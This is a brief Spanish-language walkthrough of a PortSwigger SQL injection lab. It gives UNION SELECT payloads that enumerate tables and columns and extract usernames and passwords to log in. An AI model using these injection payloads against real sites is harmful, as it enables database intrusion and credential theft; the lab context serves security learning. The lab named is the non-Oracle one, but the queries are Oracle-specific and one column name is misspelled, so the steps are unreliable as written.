[Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
Hacemos uso de la sentencia `ORDER BY 2` para el listado de las columnas

Una vez que nos responde bien, usaremos la sentencia `union select 'a','b' from dual` para visualizar si tenemos las 2 columnas disponibles 
![[Pasted image 20260331160433.png]]

Ahora listaremos las bases de datos disponibles `union select username,null from all_users`
![[Pasted image 20260331162533.png]]

ahora probaremos listando las tablas `union select table_name,null from all_tables`
![[Pasted image 20260331162758.png]]
E identificamos la tabla que dice 'USERS_LETRASALEATORIAS'
![[Pasted image 20260331163830.png]]

ahora listaremos las columnas de la tabla: `union select column_name,null from all_tab_columns`
![[Pasted image 20260331163129.png]]

Ahora listaremos las columnas de la tabla 'USERS_LETRASALEATORIAS' con la sentencia `union select column_name,null from all_tab_columns WHERE table_name='USERS_LETRASALEATORIAS'`
![[Pasted image 20260331164011.png]]

Y por ultimo listaremos el usuario y las password de las columnas de la tabla USERS_LETRASALEATORIAS
`union select USERNAME_LETRASALEATORIAS,PASSWORD_LEATRASALEATORIAS from USERS_LETRASALEATORIAS`
![[Pasted image 20260331170718.png]]

y con esto iniciaremos sesion para completar el reto:
![[Pasted image 20260331171027.png]]
